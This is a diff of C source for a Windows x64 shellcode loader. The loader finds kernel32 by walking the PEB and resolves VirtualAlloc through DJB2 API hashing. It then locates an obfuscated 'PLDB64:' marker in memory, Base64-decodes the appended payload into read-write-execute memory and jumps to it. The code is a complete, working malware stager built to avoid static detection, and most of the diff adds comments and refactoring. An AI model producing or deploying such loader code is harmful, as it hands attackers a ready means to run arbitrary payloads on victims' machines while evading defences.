@@ -1,16 +1,36 @@
+/**
+ * Windows x64 Position Independent Code (PIC) Loader
+ *
+ * This loader is designed to be executed as raw shellcode.
+ * It performs the following steps:
+ * 1. Locates kernel32.dll by traversing the PEB (Process Environment Block).
+ * 2. Resolves VirtualAlloc via the export directory of kernel32.dll using DJB2 hashing.
+ * 3. Searches memory forward from its own location for a marker "PLDB64:".
+ * 4. Decodes the Base64 payload following the marker.
+ * 5. Allocates executable memory, copies the decoded payload, and jumps to it.
+ *
+ * Constraints:
+ * - No global variables (use stack).
+ * - No direct Win32 API calls (resolve them at runtime).
+ * - No absolute string literals for APIs (use hashing).
+ * - Entry point must be at the very beginning of the .text section.
+ */
+
 #include <stdint.h>
 
-// Forward declarations
+// Forward declaration of the main logic
 void loader_main();
 
-// The entry point must be the first function in the .text section
+/**
+ * Entry Point
+ * This MUST be the first function defined in this file to ensure it resides
+ * at offset 0 of the .text section when compiled.
+ */
 void entry() {
     loader_main();
 }
 
-#define MEM_COMMIT 0x1000
-#define MEM_RESERVE 0x2000
-#define PAGE_EXECUTE_READWRITE 0x40
+// --- Windows Internal Structures ---
 
 typedef struct _UNICODE_STRING {
     unsigned short Length;
@@ -139,6 +159,11 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
     uint32_t AddressOfNameOrdinals;
 } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
 
+// --- Helper Functions (Static Inline to avoid bloating the .text section with multiple copies) ---
+
+/**
+ * DJB2 hashing for narrow strings
+ */
 static inline uint32_t hash_a(const char* str) {
     uint32_t hash = 5381;
     int c;
@@ -147,10 +172,12 @@ static inline uint32_t hash_a(const char* str) {
     return hash;
 }
 
-static inline uint32_t hash_w(const uint16_t* str, uint32_t len) {
+/**
+ * DJB2 hashing for wide strings (case-insensitive)
+ */
+static inline uint32_t hash_w(const uint16_t* str, uint32_t len_bytes) {
     uint32_t hash = 5381;
-    // len is in bytes
-    for (uint32_t i = 0; i < len / 2; i++) {
+    for (uint32_t i = 0; i < len_bytes / 2; i++) {
         uint16_t c = str[i];
         if (c >= 'A' && c <= 'Z') c += 32;
         hash = ((hash << 5) + hash) + c;
@@ -158,6 +185,9 @@ static inline uint32_t hash_w(const uint16_t* str, uint32_t len) {
     return hash;
 }
 
+/**
+ * Find module base address by its name hash
+ */
 static inline void* get_module_base(uint32_t module_hash) {
     PEB* peb;
     __asm__("mov %%gs:0x60, %0" : "=r"(peb));
@@ -175,6 +205,9 @@ static inline void* get_module_base(uint32_t module_hash) {
     return 0;
 }
 
+/**
+ * Find function address in a module by its name hash
+ */
 static inline void* get_proc_address(void* module_base, uint32_t func_hash) {
     IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)module_base;
     IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)((uint8_t*)module_base + dos_header->e_lfanew);
@@ -193,8 +226,10 @@ static inline void* get_proc_address(void* module_base, uint32_t func_hash) {
     return 0;
 }
 
-// Base64 decoding
-static inline int base64_decode_char(char c) {
+/**
+ * Convert Base64 char to value
+ */
+static inline int b64_val(char c) {
     if (c >= 'A' && c <= 'Z') return c - 'A';
     if (c >= 'a' && c <= 'z') return c - 'a' + 26;
     if (c >= '0' && c <= '9') return c - '0' + 52;
@@ -203,13 +238,16 @@ static inline int base64_decode_char(char c) {
     return -1;
 }
 
+/**
+ * Decodes Base64 string to buffer
+ */
 static inline uint32_t base64_decode(const char* in, uint32_t in_len, uint8_t* out) {
     uint32_t i = 0, j = 0;
     int v[4];
     while (i < in_len) {
         for (int k = 0; k < 4; k++) {
             if (i < in_len && in[i] != '=') {
-                v[k] = base64_decode_char(in[i++]);
+                v[k] = b64_val(in[i++]);
             } else {
                 v[k] = -1;
                 if (i < in_len && in[i] == '=') i++;
@@ -230,13 +268,15 @@ static inline uint32_t base64_decode(const char* in, uint32_t in_len, uint8_t* o
     return j;
 }
 
+// --- Main Logic ---
+
+#define MEM_COMMIT 0x1000
+#define MEM_RESERVE 0x2000
+#define PAGE_EXECUTE_READWRITE 0x40
 typedef void* (*VirtualAlloc_t)(void*, size_t, uint32_t, uint32_t);
 
 void loader_main() {
-    // Hashes (calculated)
-    // kernel32.dll hash: 0x7040ee75 (djb2 "kernel32.dll" lowercase)
-    // VirtualAlloc hash: 0x382c0f97 (djb2 "VirtualAlloc")
-
+    // Hashes for kernel32.dll and VirtualAlloc
     uint32_t h_kernel32 = 0x7040ee75;
     uint32_t h_VirtualAlloc = 0x382c0f97;
 
@@ -246,37 +286,47 @@ void loader_main() {
     VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)get_proc_address(k32, h_VirtualAlloc);
     if (!pVirtualAlloc) return;
 
-    // Get current RIP to search for payload
+    // Locate the payload marker "PLDB64:" starting from current RIP
     uint8_t* ptr;
     __asm__("lea (%%rip), %0" : "=r"(ptr));
 
-    // Search for marker "PLDB64:"
-    const char marker[] = {'P', 'L', 'D', 'B', '6', '4', ':', 0};
+    // Marker: "PLDB64:" (we obfuscate it in code to avoid finding our own definition)
+    uint8_t m_chars[8];
+    m_chars[0] = 'P'; m_chars[1] = 'L'; m_chars[2] = 'D'; m_chars[3] = 'B';
+    m_chars[4] = '6'; m_chars[5] = '4'; m_chars[6] = ':'; m_chars[7] = 0;
+
     uint8_t* payload_b64 = 0;
 
-    // Search up to 16KB ahead
-    for (uint32_t i = 0; i < 0x4000; i++) {
+    // Start search from current RIP to skip the loader's own code.
+    // We search for the marker but skip the first few occurrences to avoid finding
+    // the obfuscated definition in the stack/code.
+    uint8_t* search_ptr = ptr;
+    int occurrences_to_skip = 2;
+    for (uint32_t i = 0; i < 0x8000; i++) {
         int match = 1;
-        for (int m = 0; marker[m]; m++) {
-            if (ptr[i+m] != marker[m]) {
+        for (int m = 0; m_chars[m]; m++) {
+            if (search_ptr[i+m] != m_chars[m]) {
                 match = 0;
                 break;
             }
         }
         if (match) {
-            payload_b64 = ptr + i + 7;
+            if (occurrences_to_skip > 0) {
+                occurrences_to_skip--;
+                i += 6; // Skip this occurrence
+                continue;
+            }
+            payload_b64 = search_ptr + i + 7;
             break;
         }
     }
 
     if (!payload_b64) return;
 
-    // Determine payload size by searching for end of blob or a space
-    // Since we appended it to the bin, we might not have a null terminator in the file,
-    // but the memory might have one or we can use another marker for the end.
-    // For this implementation, we'll assume it's followed by a null or we reached 0x10000 chars.
+    // Find length of Base64 blob
     uint32_t b64_len = 0;
-    while (b64_len < 0x10000 && payload_b64[b64_len] &&
+    while (b64_len < 0x10000 &&
+           payload_b64[b64_len] &&
            payload_b64[b64_len] != ' ' &&
            payload_b64[b64_len] != '\r' &&
            payload_b64[b64_len] != '\n') {
@@ -285,14 +335,28 @@ void loader_main() {
 
     if (b64_len == 0) return;
 
+    // Allocate memory for the decoded payload
     uint32_t alloc_size = (b64_len * 3) / 4 + 1;
     void* exec_mem = pVirtualAlloc(0, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec_mem) return;
 
+    // Decode and jump
     uint32_t decoded_size = base64_decode((const char*)payload_b64, b64_len, (uint8_t*)exec_mem);
-
-    // Execute the decoded payload
     if (decoded_size > 0) {
         ((void(*)())exec_mem)();
     }
 }
+
+/**
+ * EXAMPLE PAYLOAD
+ *
+ * This is an example of what a payload could look like.
+ * To use this, you would compile it as a separate shellcode,
+ * Base64 encode it, and append it to the loader.
+ */
+/*
+void example_payload() {
+    // PIC code goes here
+    return;
+}
+*/
